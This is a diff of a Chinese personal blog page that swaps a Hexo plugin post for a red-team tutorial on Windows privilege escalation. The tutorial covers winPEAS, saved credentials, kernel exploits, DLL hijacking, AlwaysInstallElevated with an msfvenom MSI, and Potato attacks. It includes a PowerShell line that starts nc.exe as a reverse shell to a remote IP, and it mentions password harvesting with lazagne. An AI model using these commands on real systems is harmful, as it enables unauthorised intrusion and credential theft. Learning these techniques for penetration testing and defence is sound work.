@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>hexo安装短链接插件 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="hexo安装短链接插件 | 九世的博客">
+  <title>米国人的Windows中的特权升级 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="米国人的Windows中的特权升级 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1392,9 +1392,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-hexo安装短链接插件" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-米国人的Windows中的特权升级" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">hexo安装短链接插件</h1>
+        <h1 class="article-title">米国人的Windows中的特权升级</h1>
     
     <div class="article-meta">
         
@@ -1403,14 +1403,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:52:52">2019-04-19 20:40</time>
+        创建时间:<time class="date" title="更新时间: 2020-04-29 13:26:59">2020-04-29 13:03</time>
         
     </div>
     <div class="article-meta">
@@ -1432,7 +1432,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#为何要用这个插件"><span class="toc-text">为何要用这个插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置"><span class="toc-text">配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清除缓存"><span class="toc-text">清除缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#效果"><span class="toc-text">效果</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一：winPEAS寻找可提权的地方"><span class="toc-text">方法一：winPEAS寻找可提权的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二：本地存储的凭证是否有可利用的"><span class="toc-text">方法二：本地存储的凭证是否有可利用的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法三：缺少的补丁提权"><span class="toc-text">方法三：缺少的补丁提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法四：DLL劫持"><span class="toc-text">方法四：DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法五：服务问题"><span class="toc-text">方法五：服务问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法六：始终安装提升"><span class="toc-text">方法六：始终安装提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法七：修改的自启运行"><span class="toc-text">方法七：修改的自启运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法八：烂土豆提权（Tater-Hot-Potato）"><span class="toc-text">方法八：烂土豆提权（Tater / Hot Potato）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法九：第三方服务提权"><span class="toc-text">方法九：第三方服务提权</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1447,22 +1447,52 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="为何要用这个插件"><a href="#为何要用这个插件" class="headerlink" title="为何要用这个插件"></a>为何要用这个插件</h3><p>hexo默认的链接方式太长，以至于很难看，而且中文的话<br>分享到qq等等的东东又会把你url自动解码，所以这个插件能解决这些问题</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>npm install hexo-abbrlink --save
-</code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开config.yml，修改permalink中类似这样<br>permalink: posts/:abbrlink.html</p>
-<p>我的配置文件</p>
-<pre><code class="yml">permalink_defaults:
-abbrlink:
-    alg: crc32  # 算法：crc16(default) and crc32
-    rep: hex    # 进制：dec(default) and hex
-permalink: posts/:abbrlink.html
-</code></pre>
-<h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>修改完之后执行</p>
-<pre><code>hexo clean #清除缓存
-hexo g #重新渲染
-</code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://s2.ax1x.com/2019/04/19/E96OpT.png" alt=""></p>
-<p><b>转载请声明：转自422926799.github.io</b></p>
+        <p>原本前两天要更，和上一篇一样。由于懒鸽到了现在….</p>
+<blockquote>
+<p>只有生在黑暗里的蛾子才会知道黑暗的恐怖<br>飞在阳光里的蝴蝶，永远都不能明白</p>
+</blockquote>
+<h2 id="方法一：winPEAS寻找可提权的地方"><a href="#方法一：winPEAS寻找可提权的地方" class="headerlink" title="方法一：winPEAS寻找可提权的地方"></a>方法一：winPEAS寻找可提权的地方</h2><p>仓库地址：<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br><img src="https://s1.ax1x.com/2020/04/29/JTecFA.md.png" alt=""></p>
+<p>也可以用lazagne来收集密码，如果找到一个RDP可连接密码，可以用以下ps1来运行执行命令</p>
+<pre><code>$secpasswd = ConvertTo-SecureString &quot;password321&quot; -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential (&quot;john&quot;, $secpasswd)
+$computer = &quot;GHOST&quot;
+[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;192.168.0.114 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)
+</code></pre><h2 id="方法二：本地存储的凭证是否有可利用的"><a href="#方法二：本地存储的凭证是否有可利用的" class="headerlink" title="方法二：本地存储的凭证是否有可利用的"></a>方法二：本地存储的凭证是否有可利用的</h2><p>cmdkey /list查询当前存储的凭证<br><img src="https://s1.ax1x.com/2020/04/29/JTeOS0.png" alt=""></p>
+<p>以存储凭证的用户执行command<br>runas /savecred /user:JIUSHI-PC\jiushi “<command>“<br><img src="https://s1.ax1x.com/2020/04/29/JTmt0g.png" alt=""></p>
+<h2 id="方法三：缺少的补丁提权"><a href="#方法三：缺少的补丁提权" class="headerlink" title="方法三：缺少的补丁提权"></a>方法三：缺少的补丁提权</h2><p>检查由于缺少补丁程序而造成的漏洞，使用exp提权<br>windows提权exp地址：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h2 id="方法四：DLL劫持"><a href="#方法四：DLL劫持" class="headerlink" title="方法四：DLL劫持"></a>方法四：DLL劫持</h2><p>windows程序在启动时查找dll。如果这些DLL不存在，则可能通过在应用程序寻找的位置放置恶意DLL来升级特权<br>通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并将按特定的顺序检查这些路径：</p>
+<ol>
+<li>当前程序目录</li>
+<li>C:\Windows\System</li>
+<li>C:\Windows\System32</li>
+<li>当前程序目录</li>
+<li>PATH变量里的路径</li>
+</ol>
+<p>自动搜索DLL劫持工具<br>仓库地址：<a href="https://github.com/itm4n/Ikeext-Privesc" target="_blank" rel="noopener">https://github.com/itm4n/Ikeext-Privesc</a><br><img src="https://s1.ax1x.com/2020/04/29/JTmg74.png" alt=""></p>
+<h2 id="方法五：服务问题"><a href="#方法五：服务问题" class="headerlink" title="方法五：服务问题"></a>方法五：服务问题</h2><p>（1）服务路径没带引号<br>（2）服务路径所指向的可执行文件，可执行文件夹权限可被访问。用于替换exe<br>（3）服务注册表权限<br>（4）脆弱的服务权限，可被更改</p>
+<p>  之前说过，不在重复说明：<a href="https://422926799.github.io/posts/34b370c6.html">windows配置错误导致的提权 | 九世的博客</a></p>
+<h2 id="方法六：始终安装提升"><a href="#方法六：始终安装提升" class="headerlink" title="方法六：始终安装提升"></a>方法六：始终安装提升</h2><p>Windows可以通过AlwaysInstallElevated组策略允许低特权用户使用系统特权安装Microsoft Windows Installer软件包（MSI）<br><img src="https://s1.ax1x.com/2020/04/29/JTmONd.png" alt=""></p>
+<p>msf create msi</p>
+<pre><code>msfvenom -p windows/x64/exec cmd=calc.exe -f msi -o test.msi
+</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTnFEQ.png" alt=""></p>
+<p>msiexec install</p>
+<pre><code>msiexec /quiet /qn /i &lt;msi.path&gt;
 
+反之uninstall msi
+msiexec /quiet /uninstall &lt;msi.path&gt;
+</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTnJ81.png" alt=""></p>
+<p>Process观察进程可见到是SYSTEM权限运行的<br><img src="https://s1.ax1x.com/2020/04/29/JTntv6.png" alt=""></p>
+<h2 id="方法七：修改的自启运行"><a href="#方法七：修改的自启运行" class="headerlink" title="方法七：修改的自启运行"></a>方法七：修改的自启运行</h2><p>如果可以修改自动运行的路径，因此将文件替换为有效负载。 要以提升的特权执行它，我们需要等待Administrators组中的某人登录。<br><img src="https://s1.ax1x.com/2020/04/29/JTndbD.png" alt=""></p>
+<p>检查各个文件夹的权限</p>
+<pre><code>icacls &quot;&lt;dirpath&gt;&quot;
+</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTncxP.png" alt=""></p>
+<p>当其中一个文件夹有权限可以进行控制的话，生成exe替换掉原有的exe<br><img src="https://s1.ax1x.com/2020/04/29/JTnhVg.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/04/29/JTn4aQ.md.png" alt=""></p>
+<h2 id="方法八：烂土豆提权（Tater-Hot-Potato）"><a href="#方法八：烂土豆提权（Tater-Hot-Potato）" class="headerlink" title="方法八：烂土豆提权（Tater / Hot Potato）"></a>方法八：烂土豆提权（Tater / Hot Potato）</h2><p>条件限制：<br>1.需要支持SeImpersonate或者SeAssignPrimaryToken权限（通常情况下IIS、MSSQL具有这两个权限）<br>2.开启DCOM本地支持RPC或者远程服务器支持PRC并能成功登录<br>3.能够找到可用的COM对象</p>
+<p>juicy-potato：<a href="https://zhuanlan.zhihu.com/p/113178989" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/113178989</a><br>改进版juicy-potato:<a href="https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato</a><br>对应编号：MS16-075 <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p>
+<h2 id="方法九：第三方服务提权"><a href="#方法九：第三方服务提权" class="headerlink" title="方法九：第三方服务提权"></a>方法九：第三方服务提权</h2><p>通过枚举正在运行的服务，查其权限。看看有什么可以利用的，比如mysql的UDF</p>
+<pre><code>wmic service where started=true get name, startname
+</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1471,12 +1501,12 @@ hexo g #重新渲染
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>hexo安装短链接插件</p>
+    <p><span class="copy-title">文章标题:</span>米国人的Windows中的特权升级</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-19, 20:40:34</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:52:52</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/29a80ae2.html" title="hexo安装短链接插件">http://422926799.github.io/posts/29a80ae2.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-29, 13:03:56</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-29, 13:26:59</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/52bcf532.html" title="米国人的Windows中的特权升级">http://422926799.github.io/posts/52bcf532.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
